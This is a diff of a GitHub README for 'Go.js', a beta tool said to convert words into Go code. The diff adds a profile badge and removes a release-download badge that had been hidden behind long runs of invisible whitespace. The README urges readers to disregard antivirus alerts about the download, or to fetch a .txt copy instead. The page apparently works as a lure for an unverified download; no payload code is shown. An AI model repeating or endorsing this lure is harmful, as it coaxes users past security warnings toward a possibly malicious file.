@@ -4,6 +4,7 @@
 [![Download zip](https://img.shields.io/badge/JavaScript-323330?style=for-the-badge&logo=javascript&logoColor=F7DF1E "Download Zip")](https://github.com/sebastian-sestaliuc/Go.js/releases/tag/v1) 
 [![Download zip](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white "Download Zip")](https://github.com/sebastian-sestaliuc/Go.js/releases/tag/v1) 
 <br /> <br />
+[![Download zip](https://img.shields.io/badge/GitHub-Profile-blue)](https://github.com/GoPorts)<br /> 
 # What is Go.js?
 
 **Go.js is still in beta, thus it can give you code that dosent work, be aware** <br /> <br />
@@ -11,11 +12,6 @@ Go.js is a JavaScript/TypeScript code that converts simple words into GO code <b
 Go.js is still under development <br />
 you also must know that your antivirus might get trigget of the js code, if it does download the .txt file insted <br />
 more info by scrolling down <br />
-<br /><br />
-
-‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎    ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎  ‎‎ ‎  ‎   ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎ ‎ ‎  ‎‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎ ‎ ‎  ‎ ‎  ‎ ‎   ‎ ‎ ‎  ‎  ‎ ‎ ‎ ‎  ‎ ‎  ![Go-removebg-preview (1) (1)](https://github.com/user-attachments/assets/15b8f861-657f-48f5-bfae-418719ffc05f)
-
-‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎  ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎ ‎  ‎  [![Download zip](https://img.shields.io/badge/Download-Go.js-blue)](https://github.com/sebastian-sestaliuc/Go.js/releases/tag/v1)<br /> 
 <br /><br />
  <hr>
  
